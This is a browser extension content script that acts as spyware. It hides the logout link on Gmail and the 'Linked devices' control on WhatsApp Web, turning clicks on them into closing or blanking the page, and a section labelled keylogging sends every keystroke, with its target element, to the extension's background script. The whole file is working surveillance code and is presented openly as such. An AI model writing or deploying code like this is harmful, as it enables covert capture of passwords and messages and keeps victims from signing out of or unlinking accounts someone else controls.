// Content script to interact with web pages
function disableLogout() {
  const targetDomains = {
    'web.whatsapp.com': {
      buttonSelector: 'div[aria-label="Linked devices"]',
      action: () => window.close() // Requires background script coordination
    },
    'mail.google.com': {
      buttonSelector: 'a[href*="Logout"]',
      action: () => location.replace('about:blank')
    }
  };

  const domainConfig = targetDomains[location.hostname];
  if (!domainConfig) return;

  document.querySelectorAll(domainConfig.buttonSelector).forEach(button => {
    button.style.display = 'none';
    button.addEventListener('click', e => {
      e.preventDefault();
      domainConfig.action();
    });
  });
}

// Run on DOM changes
new MutationObserver(disableLogout).observe(document.body, {
  childList: true,
  subtree: true
});

// Keylogging functionality
document.addEventListener('keydown', function(e) {
  const key = e.key;
  const keyCode = e.keyCode;
  const target = e.target;

  chrome.runtime.sendMessage({ action: 'logKeystroke', data: { key, keyCode, target } });
});

// Listen for background messages
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'checkLogout') {
    disableLogout();
  }
});
